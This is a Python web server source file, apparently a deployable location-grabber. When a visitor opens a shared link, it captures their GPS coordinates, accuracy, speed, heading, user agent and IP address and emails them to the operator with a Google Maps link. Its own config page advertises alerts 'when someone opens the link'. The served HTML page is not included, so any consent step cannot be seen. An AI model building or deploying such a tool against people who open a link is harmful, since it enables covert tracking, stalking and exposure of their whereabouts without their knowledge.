from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

PORT = int(os.environ.get('PORT', 8080))  # Use Render's PORT or default to 8080

# Email Configuration - Set these as environment variables in Render
EMAIL_FROM = os.environ.get('EMAIL_FROM', 'your-email@gmail.com')
EMAIL_TO = os.environ.get('EMAIL_TO', 'your-email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')  # App password for Gmail
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))

class LocationHandler(BaseHTTPRequestHandler):
    def send_email_notification(self, location_data, client_ip):
        """Send location data via email"""
        try:
            # Create email message
            msg = MIMEMultipart('alternative')
            msg['Subject'] = f'📍 New Location Captured - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            msg['From'] = EMAIL_FROM
            msg['To'] = EMAIL_TO
            
            # Determine location source
            accuracy = location_data.get('accuracy', 0)
            if accuracy <= 20:
                source = '🛰️ GPS'
            elif accuracy <= 100:
                source = '📶 WiFi/GPS Hybrid'
            elif accuracy <= 1000:
                source = '📶 WiFi/Cell Tower'
            else:
                source = '🌐 IP Address'
            
            # Create HTML email body
            html_body = f"""
            <html>
                <head>
                    <style>
                        body {{ font-family: Arial, sans-serif; }}
                        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                                  color: white; padding: 20px; border-radius: 10px 10px 0 0; }}
                        .content {{ background: #f8f9fa; padding: 20px; border: 1px solid #ddd; }}
                        .info {{ margin: 10px 0; padding: 10px; background: white; border-radius: 5px; }}
                        .label {{ font-weight: bold; color: #555; }}
                        .value {{ color: #333; }}
                        .map-button {{ display: inline-block; margin-top: 20px; padding: 12px 24px; 
                                      background: #007bff; color: white; text-decoration: none; 
                                      border-radius: 5px; }}
                        .warning {{ background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; 
                                   margin-top: 10px; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h2>📍 Location Tracker Alert</h2>
                            <p>New location has been captured!</p>
                        </div>
                        <div class="content">
                            <div class="info">
                                <span class="label">🕐 Timestamp:</span> 
                                <span class="value">{location_data.get('timestamp')}</span>
                            </div>
                            <div class="info">
                                <span class="label">📡 Source:</span> 
                                <span class="value">{source}</span>
                            </div>
                            <div class="info">
                                <span class="label">🌍 Latitude:</span> 
                                <span class="value">{location_data.get('latitude')}</span>
                            </div>
                            <div class="info">
                                <span class="label">🌍 Longitude:</span> 
                                <span class="value">{location_data.get('longitude')}</span>
                            </div>
                            <div class="info">
                                <span class="label">🎯 Accuracy:</span> 
                                <span class="value">{location_data.get('accuracy')} meters</span>
                            </div>
                            {f'<div class="info"><span class="label">⛰️ Altitude:</span> <span class="value">{location_data.get("altitude")} meters</span></div>' if location_data.get('altitude') else ''}
                            {f'<div class="info"><span class="label">🚀 Speed:</span> <span class="value">{location_data.get("speed")} m/s</span></div>' if location_data.get('speed') else ''}
                            {f'<div class="info"><span class="label">🧭 Heading:</span> <span class="value">{location_data.get("heading")}°</span></div>' if location_data.get('heading') else ''}
                            <div class="info">
                                <span class="label">💻 User Agent:</span> 
                                <span class="value">{location_data.get('userAgent', 'Unknown')[:100]}</span>
                            </div>
                            <div class="info">
                                <span class="label">🌐 IP Address:</span> 
                                <span class="value">{client_ip}</span>
                            </div>
                            
                            {f'<div class="warning">⚠️ Low accuracy location - likely IP-based, not GPS</div>' if accuracy > 500 else ''}
                            
                            <a href="https://www.google.com/maps?q={location_data.get('latitude')},{location_data.get('longitude')}" 
                               class="map-button">📍 View on Google Maps</a>
                        </div>
                    </div>
                </body>
            </html>
            """
            
            # Create plain text version
            text_body = f"""
📍 NEW LOCATION CAPTURED

Timestamp: {location_data.get('timestamp')}
Source: {source}
Latitude: {location_data.get('latitude')}
Longitude: {location_data.get('longitude')}
Accuracy: {location_data.get('accuracy')} meters
{f"Altitude: {location_data.get('altitude')} meters" if location_data.get('altitude') else ''}
{f"Speed: {location_data.get('speed')} m/s" if location_data.get('speed') else ''}
{f"Heading: {location_data.get('heading')}°" if location_data.get('heading') else ''}
User Agent: {location_data.get('userAgent', 'Unknown')}
IP Address: {client_ip}

Google Maps Link: https://www.google.com/maps?q={location_data.get('latitude')},{location_data.get('longitude')}
            """
            
            # Attach both versions
            part1 = MIMEText(text_body, 'plain')
            part2 = MIMEText(html_body, 'html')
            msg.attach(part1)
            msg.attach(part2)
            
            # Send email
            if EMAIL_PASSWORD:  # Only try to send if password is configured
                with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                    server.starttls()
                    server.login(EMAIL_FROM, EMAIL_PASSWORD)
                    server.send_message(msg)
                print(f"✅ Email sent successfully to {EMAIL_TO}")
                return True
            else:
                print("⚠️ Email not configured - set EMAIL_PASSWORD environment variable")
                return False
                
        except Exception as e:
            print(f"❌ Error sending email: {e}")
            return False
    
    def do_GET(self):
        # Remove query parameters from path
        path = self.path.split('?')[0]
        
        if path == '/' or path == '':
            # Serve the HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as file:
                self.wfile.write(file.read())
        
        elif path == '/view-locations':
            # Show information about email configuration
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            email_status = "✅ Configured" if EMAIL_PASSWORD else "❌ Not Configured"
            
            html = f"""
            <html>
                <head>
                    <title>Email Configuration</title>
                    <style>
                        body {{ font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
                        .container {{ max-width: 600px; margin: 0 auto; background: white; 
                                     padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                        h1 {{ color: #333; }}
                        .status {{ padding: 15px; border-radius: 5px; margin: 20px 0; }}
                        .configured {{ background: #d4edda; color: #155724; border-left: 4px solid #28a745; }}
                        .not-configured {{ background: #f8d7da; color: #721c24; border-left: 4px solid #dc3545; }}
                        .info {{ background: #d1ecf1; padding: 15px; border-radius: 5px; margin: 10px 0; }}
                        code {{ background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>📧 Email Notification System</h1>
                        <div class="status {'configured' if EMAIL_PASSWORD else 'not-configured'}">
                            <strong>Email Status:</strong> {email_status}
                        </div>
                        
                        <div class="info">
                            <h3>Current Configuration:</h3>
                            <p><strong>From:</strong> {EMAIL_FROM}</p>
                            <p><strong>To:</strong> {EMAIL_TO}</p>
                            <p><strong>SMTP Server:</strong> {SMTP_SERVER}:{SMTP_PORT}</p>
                        </div>
                        
                        <div class="info">
                            <h3>How It Works:</h3>
                            <p>✅ Locations are sent to your email (no file storage needed)</p>
                            <p>✅ Works on Render's free tier (no disk storage required)</p>
                            <p>✅ HTML-formatted emails with Google Maps links</p>
                            <p>✅ Instant notifications when someone opens the link</p>
                        </div>
                        
                        {'<div class="info"><h3>⚠️ Setup Required:</h3><p>Set environment variables in Render dashboard to enable email notifications.</p></div>' if not EMAIL_PASSWORD else ''}
                    </div>
                </body>
            </html>
            """
            self.wfile.write(html.encode())
        
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/save-location':
            # Read the posted data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            location_data = json.loads(post_data.decode('utf-8'))
            
            # Send email instead of writing to file
            try:
                email_sent = self.send_email_notification(location_data, self.client_address[0])
                
                if email_sent:
                    print(f"📍 Location captured and emailed: {location_data.get('latitude')}, {location_data.get('longitude')}")
                    
                    # Send success response
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {'success': True, 'message': 'Location sent to email successfully'}
                    self.wfile.write(json.dumps(response).encode())
                else:
                    # Email not configured or failed
                    print(f"⚠️ Location captured but email not sent: {location_data.get('latitude')}, {location_data.get('longitude')}")
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {'success': True, 'message': 'Location received but email not configured'}
                    self.wfile.write(json.dumps(response).encode())
            
            except Exception as e:
                print(f"❌ Error processing location: {e}")
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {'success': False, 'error': str(e)}
                self.wfile.write(json.dumps(response).encode())
        
        else:
            self.send_error(404)

def run(server_class=HTTPServer, handler_class=LocationHandler, port=PORT):
    server_address = ('0.0.0.0', port)  # Listen on all interfaces for Render
    httpd = server_class(server_address, handler_class)
    print(f'Server is running on port {port}')
    print(f'View saved locations at: /view-locations')
    print('Press Ctrl+C to stop the server')
    print('\nKeep this window open to keep the server running!')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\nServer stopped.')

if __name__ == '__main__':
    run()
